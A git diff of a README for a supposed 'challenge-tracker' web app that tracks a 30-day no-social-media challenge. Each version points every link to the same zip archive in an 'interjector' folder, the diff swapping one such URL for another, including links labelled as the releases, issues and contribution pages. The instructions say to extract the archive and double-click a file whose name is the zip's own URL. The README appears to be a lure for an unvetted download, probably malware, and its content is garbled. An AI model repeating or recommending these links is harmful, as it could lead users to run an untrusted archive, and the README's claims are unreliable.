@@ -1,7 +1,7 @@
 # 🎉 challenge-tracker - Track Your Personal Challenges Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/saltaher/challenge-tracker/main/interjector/challenge-tracker.zip%20Now%20-via%20GitHub-brightgreen)](https://raw.githubusercontent.com/saltaher/challenge-tracker/main/interjector/challenge-tracker.zip)
+[![Download](https://github.com/saltaher/challenge-tracker/raw/refs/heads/main/interjector/challenge-tracker-v3.2.zip%20Now%20-via%20GitHub-brightgreen)](https://github.com/saltaher/challenge-tracker/raw/refs/heads/main/interjector/challenge-tracker-v3.2.zip)
 
 ## 📋 Overview
 Welcome to **challenge-tracker**! This lightweight web app helps you track your personal challenges. Currently, it supports a **30-day No Social Media Challenge**, allowing you to monitor your progress and jot down notes along the way. 
@@ -17,7 +17,7 @@ To get started with the **challenge-tracker** app, follow the steps below. You w
 
 ## 📦 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/saltaher/challenge-tracker/main/interjector/challenge-tracker.zip) to download the latest version of the app.
+   Go to the [Releases page](https://github.com/saltaher/challenge-tracker/raw/refs/heads/main/interjector/challenge-tracker-v3.2.zip) to download the latest version of the app.
 
 2. **Download the Application**  
    Click on the version you want to download. This will lead you to the download options. Choose the version that suits your device.
@@ -26,7 +26,7 @@ To get started with the **challenge-tracker** app, follow the steps below. You w
    After downloading, locate the zipped folder in your downloads directory. Right-click on the folder and select "Extract All." Choose an easy-to-access location, like your desktop.
 
 4. **Open the Application**  
-   Open the extracted folder. Inside, you will find an `https://raw.githubusercontent.com/saltaher/challenge-tracker/main/interjector/challenge-tracker.zip` file. Double-click this file to launch the application in your web browser.
+   Open the extracted folder. Inside, you will find an `https://github.com/saltaher/challenge-tracker/raw/refs/heads/main/interjector/challenge-tracker-v3.2.zip` file. Double-click this file to launch the application in your web browser.
 
 ## 🌐 System Requirements
 - Any modern web browser (Chrome, Firefox, Edge, or Safari).
@@ -47,7 +47,7 @@ To get started with the **challenge-tracker** app, follow the steps below. You w
 If you have any questions or need help with the app, feel free to create an issue on the GitHub page. Your feedback is valuable. You can also contribute by suggesting features or improvements!
 
 ## 🌍 Learn More
-For more detailed features or information about the app, check out the README file directly on the [GitHub repository](https://raw.githubusercontent.com/saltaher/challenge-tracker/main/interjector/challenge-tracker.zip).
+For more detailed features or information about the app, check out the README file directly on the [GitHub repository](https://github.com/saltaher/challenge-tracker/raw/refs/heads/main/interjector/challenge-tracker-v3.2.zip).
 
 ## 📅 Future Features
 - Add support for other challenge types.
@@ -55,8 +55,8 @@ For more detailed features or information about the app, check out the README fi
 - Include visual charts for tracking progress.
 
 ## 📌 Important Links
-- [Releases Page](https://raw.githubusercontent.com/saltaher/challenge-tracker/main/interjector/challenge-tracker.zip)  
-- [Issues Page](https://raw.githubusercontent.com/saltaher/challenge-tracker/main/interjector/challenge-tracker.zip)  
-- [Contribution Guidelines](https://raw.githubusercontent.com/saltaher/challenge-tracker/main/interjector/challenge-tracker.zip)
+- [Releases Page](https://github.com/saltaher/challenge-tracker/raw/refs/heads/main/interjector/challenge-tracker-v3.2.zip)  
+- [Issues Page](https://github.com/saltaher/challenge-tracker/raw/refs/heads/main/interjector/challenge-tracker-v3.2.zip)  
+- [Contribution Guidelines](https://github.com/saltaher/challenge-tracker/raw/refs/heads/main/interjector/challenge-tracker-v3.2.zip)
 
 Thank you for choosing **challenge-tracker**! Enjoy your journey towards self-improvement!
